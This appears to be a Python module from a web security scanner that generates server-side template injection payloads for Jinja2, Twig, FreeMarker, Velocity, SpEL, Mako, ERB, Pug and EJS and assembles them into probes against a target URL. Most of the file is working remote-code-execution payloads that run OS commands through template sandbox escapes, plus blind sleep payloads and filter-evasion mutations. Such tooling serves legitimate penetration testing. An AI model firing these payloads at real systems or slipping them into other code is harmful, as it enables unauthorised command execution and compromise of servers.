"""SSTI payload generation across template engines and contexts."""
from __future__ import annotations

import random
from typing import Any, Dict, List, Optional, Tuple, Union

from argus.collectors.ssti.models import (
    SSTIProbe,
    SSTITechnique,
    SSTIEngineFamily,
    SSTIMutationStrategy,
)


class SSTIPayloadGenerator:
    """
    Generates engine-specific and polyglot payloads, differential decision tree
    probes, sandbox escapes, blind time-based delays, error triggers, and applies
    evasion mutations.
    """

    @staticmethod
    def generate_arithmetic_canary(
        engine: Union[SSTIEngineFamily, str] = SSTIEngineFamily.GENERIC,
        a: Optional[int] = None,
        b: Optional[int] = None,
    ) -> Tuple[str, str]:
        """
        Generates a mathematical template expression with dynamic operands and expected result.
        """
        if a is None or b is None:
            a = random.randint(1111, 8888)
            b = random.randint(11, 99)
        expected = str(a * b)
        eng_str = str(engine.value if isinstance(engine, SSTIEngineFamily) else engine).lower()

        if "jinja" in eng_str or "twig" in eng_str or "pebble" in eng_str or "blade" in eng_str or eng_str == "generic":
            return f"{{{{{a}*{b}}}}}", expected
        elif "freemarker" in eng_str or "mako" in eng_str or "spel" in eng_str or "django" in eng_str:
            return f"${{{a}*{b}}}", expected
        elif "velocity" in eng_str:
            return f"#set($res={a}*{b})${{res}}", expected
        elif "erb" in eng_str or "ejs" in eng_str:
            return f"<%= {a}*{b} %>", expected
        elif "pug" in eng_str:
            return f"#{{{a}*{b}}}", expected
        elif "thymeleaf" in eng_str:
            return f"[[${{{a}*{b}}}]]", expected
        elif "smarty" in eng_str:
            return f"{{{a}*{b}}}", expected
        else:
            return f"{{{{{a}*{b}}}}}", expected

    @staticmethod
    def generate_polyglot_payloads(a: int = 7, b: int = 7) -> List[Dict[str, Any]]:
        """
        Generates a catalog of polyglot arithmetic probes across delimiter syntaxes.
        """
        expected = str(a * b)
        return [
            {"payload": f"{{{{{a}*{b}}}}}", "expected": expected, "engine": SSTIEngineFamily.PYTHON_JINJA2, "delimiter": "{{}}"},
            {"payload": f"${{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_FREEMARKER, "delimiter": "${}"},
            {"payload": f"<%= {a}*{b} %>", "expected": expected, "engine": SSTIEngineFamily.RUBY_ERB, "delimiter": "<%= %>"},
            {"payload": f"#{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.NODE_PUG, "delimiter": "#{}"},
            {"payload": f"*{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_SPEL, "delimiter": "*{}"},
            {"payload": f"[#ftl]${{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_FREEMARKER, "delimiter": "[#ftl]${}"},
            {"payload": f"{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.PHP_SMARTY, "delimiter": "{}"},
            {"payload": f"[[${{{a}*{b}}}]]", "expected": expected, "engine": SSTIEngineFamily.JAVA_THYMELEAF, "delimiter": "[[${}]]"},
        ]

    @staticmethod
    def generate_differential_payloads() -> List[Dict[str, Any]]:
        """
        Generates differential decision tree payloads for engine disambiguation.
        """
        return [
            # Decision point: {{7*'7'}}
            # Jinja2 / Python yields "7777777" (string repetition)
            # Twig / PHP yields "49" (string typecast to integer)
            # Mako / FreeMarker raises error or renders differently
            {
                "payload": "{{7*'7'}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "type_coercion",
                "rules": {
                    "7777777": SSTIEngineFamily.PYTHON_JINJA2,
                    "49": SSTIEngineFamily.PHP_TWIG,
                },
            },
            # Jinja2 environment / config inspection
            {
                "payload": "{{config}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "config_object",
                "expected_signature": r"<Config\s*\{|\'ENV\':",
                "engine": SSTIEngineFamily.PYTHON_JINJA2,
            },
            # Twig self inspection
            {
                "payload": "{{_self.env}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "twig_self",
                "expected_signature": r"Twig[_\\]Environment",
                "engine": SSTIEngineFamily.PHP_TWIG,
            },
            # FreeMarker assign directive
            {
                "payload": "<#assign ssti_test=1337>${ssti_test}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "freemarker_assign",
                "expected_canary": "1337",
                "engine": SSTIEngineFamily.JAVA_FREEMARKER,
            },
            # SpEL Type reference
            {
                "payload": "T(java.lang.System).currentTimeMillis()",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "spel_type_ref",
                "expected_signature": r"\b\d{10,13}\b",
                "engine": SSTIEngineFamily.JAVA_SPEL,
            },
            # Mako globals inspection
            {
                "payload": "${self.__init__.__globals__}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "mako_globals",
                "expected_signature": r"\'__file__\':|\'UNDEFINED\':",
                "engine": SSTIEngineFamily.PYTHON_MAKO,
            },
            # Smarty version
            {
                "payload": "{$smarty.version}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "smarty_version",
                "expected_signature": r"\b[234]\.\d+\.\d+\b",
                "engine": SSTIEngineFamily.PHP_SMARTY,
            },
            # Ruby ERB class introspection
            {
                "payload": "<%= self.class %>",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "erb_self_class",
                "expected_signature": r"Object|ActionView|ERB",
                "engine": SSTIEngineFamily.RUBY_ERB,
            },
            # Node Pug process inspection
            {
                "payload": "#{root.process.mainModule.filename}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "pug_process",
                "expected_signature": r"\.js|\.node",
                "engine": SSTIEngineFamily.NODE_PUG,
            },
        ]

    @staticmethod
    def generate_sandbox_escape_payloads(
        engine: Union[SSTIEngineFamily, str] = SSTIEngineFamily.GENERIC,
    ) -> List[Dict[str, Any]]:
        """
        Generates sandbox escape and code execution payload suites across engine families.
        """
        eng_str = str(engine.value if isinstance(engine, SSTIEngineFamily) else engine).lower()
        payloads: List[Dict[str, Any]] = []

        # Jinja2 escapes
        if "jinja" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"subprocess\.Popen|os\._wrap_close|warnings\.catch_warnings",
                    "description": "Python MRO subclass traversal",
                },
                {
                    "payload": "{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"uid=\d+",
                    "description": "Jinja2 lipsum builtins os.popen RCE",
                },
                {
                    "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"uid=\d+",
                    "description": "Jinja2 cycler globals os.popen RCE",
                },
            ])

        # Twig escapes
        if "twig" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
                    "engine": SSTIEngineFamily.PHP_TWIG,
                    "expected_signature": r"uid=\d+",
                    "description": "Twig undefined filter callback RCE",
                },
                {
                    "payload": "{{['id']|filter('system')}}",
                    "engine": SSTIEngineFamily.PHP_TWIG,
                    "expected_signature": r"uid=\d+",
                    "description": "Twig filter callback system RCE",
                },
            ])

        # FreeMarker escapes
        if "freemarker" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                    "engine": SSTIEngineFamily.JAVA_FREEMARKER,
                    "expected_signature": r"uid=\d+",
                    "description": "FreeMarker Execute utility RCE",
                },
                {
                    "payload": '<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>${obj("java.lang.ProcessBuilder","id").start()}',
                    "engine": SSTIEngineFamily.JAVA_FREEMARKER,
                    "expected_signature": r"java\.lang\.ProcessBuilder|java\.lang\.UNIXProcess",
                    "description": "FreeMarker ObjectConstructor ProcessBuilder execution",
                },
            ])

        # Velocity escapes
        if "velocity" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": '#set($e="")#set($cl=$e.getClass().forName("java.lang.Runtime"))#set($rt=$cl.getRuntime())#set($proc=$rt.exec("id"))$proc',
                "engine": SSTIEngineFamily.JAVA_VELOCITY,
                "expected_signature": r"java\.lang\.ProcessImpl|java\.lang\.UNIXProcess",
                "description": "Velocity Java Runtime reflection RCE",
            })

        # SpEL escapes
        if "spel" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "T(java.lang.Runtime).getRuntime().exec('id')",
                    "engine": SSTIEngineFamily.JAVA_SPEL,
                    "expected_signature": r"java\.lang\.ProcessImpl|java\.lang\.UNIXProcess",
                    "description": "SpEL Runtime getRuntime exec",
                },
                {
                    "payload": "new java.lang.ProcessBuilder('id').start()",
                    "engine": SSTIEngineFamily.JAVA_SPEL,
                    "expected_signature": r"java\.lang\.ProcessBuilder",
                    "description": "SpEL ProcessBuilder start",
                },
            ])

        # Mako escapes
        if "mako" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "<%import os%>${os.popen('id').read()}",
                "engine": SSTIEngineFamily.PYTHON_MAKO,
                "expected_signature": r"uid=\d+",
                "description": "Mako inline Python import os.popen RCE",
            })

        # ERB escapes
        if "erb" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "<%= `id` %>",
                    "engine": SSTIEngineFamily.RUBY_ERB,
                    "expected_signature": r"uid=\d+",
                    "description": "Ruby ERB backtick command execution",
                },
                {
                    "payload": "<%= IO.popen('id').readlines().join %>",
                    "engine": SSTIEngineFamily.RUBY_ERB,
                    "expected_signature": r"uid=\d+",
                    "description": "Ruby ERB IO.popen execution",
                },
            ])

        # Pug / Jade escapes
        if "pug" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "#{root.process.mainModule.require('child_process').spawnSync('id').stdout}",
                "engine": SSTIEngineFamily.NODE_PUG,
                "expected_signature": r"uid=\d+",
                "description": "Pug root.process child_process execution",
            })

        # EJS escapes
        if "ejs" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
                "engine": SSTIEngineFamily.NODE_EJS,
                "expected_signature": r"uid=\d+",
                "description": "EJS global.process child_process execution",
            })

        return payloads

    @staticmethod
    def generate_blind_timing_payloads(delay_seconds: int = 5) -> List[Dict[str, Any]]:
        """
        Generates blind time-delay template expressions.
        """
        return [
            {
                "payload": f"{{{{__import__('time').sleep({delay_seconds})}}}}",
                "engine": SSTIEngineFamily.PYTHON_JINJA2,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"${{T(java.lang.Thread).sleep({delay_seconds * 1000})}}",
                "engine": SSTIEngineFamily.JAVA_SPEL,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"<%= sleep {delay_seconds} %>",
                "engine": SSTIEngineFamily.RUBY_ERB,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"{{{{['{delay_seconds}']|filter('sleep')}}}}",
                "engine": SSTIEngineFamily.PHP_TWIG,
                "delay_seconds": delay_seconds,
            },
        ]

    @staticmethod
    def generate_error_trigger_payloads() -> List[Dict[str, Any]]:
        """
        Generates syntactically malformed template triggers designed to provoke engine stack traces.
        """
        return [
            {"payload": "{{'test'%}}", "engine": SSTIEngineFamily.PYTHON_JINJA2, "syntax": "unclosed_filter"},
            {"payload": "{{1/0}}", "engine": SSTIEngineFamily.PYTHON_JINJA2, "syntax": "zero_division"},
            {"payload": "${bad.syntax(}", "engine": SSTIEngineFamily.JAVA_FREEMARKER, "syntax": "unclosed_paren"},
            {"payload": "<#bad_tag_ssti_test>", "engine": SSTIEngineFamily.JAVA_FREEMARKER, "syntax": "invalid_directive"},
            {"payload": "{% invalid_tag_ssti %}", "engine": SSTIEngineFamily.PYTHON_DJANGO, "syntax": "invalid_block"},
            {"payload": "${invalid.expression.probe()}", "engine": SSTIEngineFamily.JAVA_SPEL, "syntax": "missing_bean"},
        ]

    @staticmethod
    def apply_mutation_strategy(
        payload: str,
        strategy: Union[SSTIMutationStrategy, str],
        **kwargs: Any,
    ) -> str:
        """
        Applies one of the 5 mutation and evasion strategies to a base payload.
        """
        strat_val = strategy.value if isinstance(strategy, SSTIMutationStrategy) else strategy

        # Strategy 1: String Concatenation & Character Encoding
        if strat_val == SSTIMutationStrategy.STRING_CONCAT_ENCODING.value:
            if "__class__" in payload:
                payload = payload.replace("__class__", "('__cla' + 'ss__')")
            elif "class" in payload:
                payload = payload.replace("class", "('cla' + 'ss')")
            if "os" in payload:
                payload = payload.replace("'os'", "('o' ~ 's')")
            if "id" in payload:
                payload = payload.replace("'id'", "('\\x69\\x64')")
            return payload

        # Strategy 2: Attribute & Property Indirection
        elif strat_val == SSTIMutationStrategy.ATTRIBUTE_INDIRECTION.value:
            if ".__class__" in payload:
                payload = payload.replace(".__class__", "|attr('__class__')")
            elif "__class__" in payload:
                payload = payload.replace("__class__", "['__class__']")
            if ".__mro__" in payload:
                payload = payload.replace(".__mro__", "['__mro__']")
            if ".__subclasses__" in payload:
                payload = payload.replace(".__subclasses__()", "['__subclasses__']()")
            return payload

        # Strategy 3: Template Comment Inversion & Tag Delimiter Variations
        elif strat_val == SSTIMutationStrategy.COMMENT_TAG_VARIATION.value:
            if payload.startswith("{{"):
                return f"{{##}}{payload}{{# comment #}}"
            elif payload.startswith("${"):
                return f"[#ftl]{payload}"
            elif payload.startswith("<%="):
                return f"<%# comment %>{payload}"
            elif payload.startswith("#{"):
                return f"//- comment\n{payload}"
            return f"{{# ssti #}}{payload}"

        # Strategy 4: Filter & Whitespace Bypasses
        elif strat_val == SSTIMutationStrategy.FILTER_WHITESPACE_BYPASS.value:
            # Replace single spaces with tab or newline or plus
            mutated = payload.replace(" ", "\t")
            if mutated == payload:
                mutated = payload.replace("{{", "{{ \t\n ").replace("}}", " \n\t}}")
            return mutated

        # Strategy 5: Object Instantiation & Classloader Navigation
        elif strat_val == SSTIMutationStrategy.OBJECT_CLASSLOADER_NAVIGATION.value:
            if "ProcessBuilder" in payload and not "getClassLoader" in payload:
                return payload.replace("java.lang.ProcessBuilder", "getClass().getClassLoader().loadClass('java.lang.ProcessBuilder')")
            if "Runtime" in payload and not "T(" in payload:
                return f"T(java.lang.Runtime).getRuntime().exec('id')"
            if "__subclasses__" in payload:
                return payload.replace("[1]", "[-1]")
            return payload

        return payload

    def build_all_probes(
        self,
        target_url: str,
        parameter: str,
        parameter_type: str = "query",
        method: str = "GET",
    ) -> List[SSTIProbe]:
        """
        Builds a comprehensive list of candidate probes across arithmetic, differential,
        sandbox escapes, blind timing, error triggers, and mutations.
        """
        probes: List[SSTIProbe] = []

        # 1. Differential decision tree probes (Engine Disambiguation)
        for diff in self.generate_differential_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=diff["payload"],
                    technique=SSTITechnique.DECISION_TREE_ROUTING,
                    engine=diff.get("engine", SSTIEngineFamily.GENERIC),
                    expected_canary=diff.get("expected_canary"),
                    extra=diff,
                )
            )

        # 2. Polyglot arithmetic probes
        polyglots = self.generate_polyglot_payloads()
        for poly in polyglots:
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=poly["payload"],
                    technique=SSTITechnique.ARITHMETIC_PROBE,
                    engine=poly["engine"],
                    expected_canary=poly["expected"],
                )
            )

        # 3. Dynamic arithmetic probe with randomized operands
        rand_payload, rand_expected = self.generate_arithmetic_canary()
        probes.append(
            SSTIProbe(
                url=target_url,
                method=method,
                parameter=parameter,
                parameter_type=parameter_type,
                payload=rand_payload,
                technique=SSTITechnique.ARITHMETIC_PROBE,
                engine=SSTIEngineFamily.GENERIC,
                expected_canary=rand_expected,
            )
        )


        # 4. Sandbox escape payloads
        for esc in self.generate_sandbox_escape_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=esc["payload"],
                    technique=SSTITechnique.SANDBOX_ESCAPE_RCE,
                    engine=esc["engine"],
                    extra=esc,
                )
            )

        # 5. Mutated payloads (5 strategies)
        base_jinja = "{{7*7}}"
        for strat in SSTIMutationStrategy:
            mut_payload = self.apply_mutation_strategy(base_jinja, strat)
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=mut_payload,
                    technique=SSTITechnique.ARITHMETIC_PROBE,
                    engine=SSTIEngineFamily.PYTHON_JINJA2,
                    mutation_strategy=strat,
                    expected_canary="49",
                )
            )

        # 6. Blind time-based delay probes
        for blind in self.generate_blind_timing_payloads(delay_seconds=5):
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=blind["payload"],
                    technique=SSTITechnique.BLIND_TIME_BASED,
                    engine=blind["engine"],
                    extra=blind,
                )
            )

        # 7. Error trigger probes
        for err in self.generate_error_trigger_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=err["payload"],
                    technique=SSTITechnique.ERROR_BASED_FINGERPRINT,
                    engine=err["engine"],
                    extra=err,
                )
            )

        return probes


# =============================================================================
# Security Analyzer
# =============================================================================

